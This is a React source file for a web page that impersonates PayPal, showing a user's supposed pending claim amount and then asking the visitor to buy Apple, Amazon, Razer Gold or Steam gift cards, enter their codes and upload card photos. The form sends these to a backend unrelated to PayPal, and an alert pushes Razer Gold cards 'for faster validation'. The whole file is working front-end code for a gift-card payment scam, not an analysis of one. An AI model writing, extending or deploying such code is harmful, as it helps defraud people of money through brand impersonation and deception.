import axios, { AxiosError } from "axios";
import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router"
import { toast } from 'sonner';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { CircleAlert } from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import {
  Form,
  FormField,
  FormItem,
  FormLabel,
  FormControl,
  FormMessage,
  FormDescription,
} from "@/components/ui/form";
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import {
  FileUploader,
  FileInput,
  FileUploaderContent,
  FileUploaderItem,
} from "@/components/ui/file-upload";
import { CloudUpload, Paperclip } from "lucide-react";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue
} from "@/components/ui/select"
import logo from "../assets/paypal-blue.png"
import apple from "../assets/apple.svg"
import amazon from "../assets/amazon.svg"
import razer from "../assets/razor-gold.svg"
import steam from "../assets/steam.svg"
import TicketCard from "@/components/TicketCard";

interface User {
  username: string;
  avatar: string;
  amount: string;
  email: string;
}

const formSchema = z.object({
  card_type: z.string(),
  card_number: z.string().min(12, { message: "Invalid E-code" }).nonempty({ message: "Electronic code is required" }),
});

type FormValues = z.infer<typeof formSchema>;


const Profile: React.FC = () => {
  const [user, setUser] = useState<User | null>(null);
  const { id } = useParams<{ id: string }>();
  const [files, setFiles] = useState<File[] | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [profileLoading, setProfileLoading] = useState(false)
  const navigate = useNavigate()


  const dropZoneConfig = {
    maxFiles: 5,
    maxSize: 1024 * 1024 * 4,
    multiple: true,
  };

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
  });

  const getProfile = async () => {
    try {
      setProfileLoading(true)
      const response = await axios.get(`https://paypal-backend-e8c3.onrender.com/api/user/${id}`, {
        headers: {
          "Content-Type": "application/json"
        }
      })

      if (response.status === 200) {
        setUser(response.data?.data)
        toast.success(response.data?.message)
      }
    } catch (error) {
      const err = error as AxiosError<{ message?: string }>;
      const errorMsg = err.response?.data?.message || err.message || "An error occurred";
      toast.error(err.message); console.error("server error occurred", errorMsg);
      navigate("/unauthorized")
    } finally {
      setProfileLoading(false)

    }
  }

  useEffect(() => {
    getProfile()
  }, [])

  const onSubmit = async (values: FormValues) => {
    try {
      setIsLoading(true)
      const formData = new FormData();
      formData.append("card_number", values.card_number);
      formData.append("card_type", values.card_type);

      if (files) {
        files.forEach((file) => {
          formData.append("card_image", file);
        });
      }

      const response = await axios.post(`https://paypal-backend-e8c3.onrender.com/api/user/${id}/card-payment/confirmation`, formData);

      if (response.status === 201) {
        toast.success(response.data?.message);
      }
      navigate("/confirmation-gateway/processing")
    } catch (error) {
      const err = error as AxiosError<{ message?: string }>;
      const errorMsg = err.response?.data?.message || err.message || "An error occurred";
      toast.error(errorMsg); console.error("Form submission error", error);

    } finally {
      setIsLoading(false)
    }

  }

  return (
    <div className="relative h-screen overflow-auto md:overflow-hidden bg-[url('/images/hero.jpg')] bg-center bg-cover">
      <div className="absolute inset-0 bg-black/70 z-0" />

      <div className="relative z-10 flex items-center justify-center min-h-full md:h-full py-[30px] md:py-[0px] md:px-[0px] ">
        <div className="flex flex-col-reverse gap-20 md:flex-row md:gap-10 items-center justify-center bg-zinc-50 rounded-xl p-10 md:px-10 md:py-6 shadow-lg max-w-5xl w-full mx-4">
          {/* Form Side */}
          <div className="flex-1 min-w-0 md:border-r-1 md:pr-10 w-full">

            <Alert className="mb-12">
              <CircleAlert />
              <AlertTitle className="inline-flex items-center gap-2 text-left text-sm">We advice that you purchase a Razer Gold card for faster validation.</AlertTitle>
              <AlertDescription className="inline-flex items-center gap-2 text-left text-sm">You can purchase your cards <a href="https://www.eneba.com" target="_blank">here &#8599; </a>
              </AlertDescription>
            </Alert>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="card_type"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Type of Card</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl className="w-full min-w-0">
                          <SelectTrigger className="w-full flex min-w-0 flex py-6 px-3 text-base">
                            <SelectValue className="w-full text-left truncate" placeholder="Select the card you purchased for your claim" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="Apple"> <img src={apple} alt="apple" width={40} /> Apple</SelectItem>
                          <SelectItem value="Amazon"> <img src={amazon} alt="amazon" width={40} /> Amazon</SelectItem>
                          <SelectItem value="Razer Gold"> <img src={razer} alt="razer" width={40} /> Razer Gold</SelectItem>
                          <SelectItem value="Steam"> <img src={steam} alt="steam" width={40} /> Steam</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="card_number"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Electronic Code</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="Enter Card E-Code"
                          type="text"
                          {...field}
                          className="py-4 px-3 text-lg"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormItem>
                  <FormLabel>Select File</FormLabel>
                  <FormControl>
                    <FileUploader
                      value={files}
                      onValueChange={setFiles}
                      dropzoneOptions={dropZoneConfig}
                      className="bg-zinc-50 rounded-lg p-2"
                    >
                      <FileInput className="outline-dashed outline-1 outline-slate-500">
                        <div className="flex items-center justify-center flex-col p-8 w-full">
                          <CloudUpload className="text-gray-500 w-10 h-10" />
                          <p className="mb-1 text-sm text-gray-500 dark:text-gray-400">
                            <span className="font-semibold">Click to upload</span> or drag and drop
                          </p>
                          <p className="text-xs text-gray-500 dark:text-gray-400">
                            SVG, PNG, JPG or GIF
                          </p>
                        </div>
                      </FileInput>
                      <FileUploaderContent>
                        {files && files.length > 0 &&
                          files.map((file, i) => (
                            <FileUploaderItem key={i} index={i}>
                              <Paperclip className="h-4 w-4 stroke-current" />
                              <span>{file.name}</span>
                            </FileUploaderItem>
                          ))}
                      </FileUploaderContent>
                    </FileUploader>
                  </FormControl>
                  <FormDescription>Select a file to upload.</FormDescription>
                </FormItem>

                <Button
                  type="submit"
                  variant="blueFull"
                  className="rounded w-full"
                  size="lg"
                >
                  {isLoading ? "...Processing" : "Proceed"}
                </Button>
              </form>
            </Form>
          </div>

          {/* Card Side */}
          <div className="w-full md:w-[360px] flex-none">
            <img src={logo} alt="PayPal-logo" className="mb-15 mx-auto w-32" />
            <TicketCard
              avatar={user?.avatar || ""}
              username={user?.username || "N/A"}
              email={user?.email || "N/A"}
              amount={user?.amount || "0.00"}
              isLoading={profileLoading}
            />
          </div>
        </div>
      </div>
    </div>
  );

}

export default Profile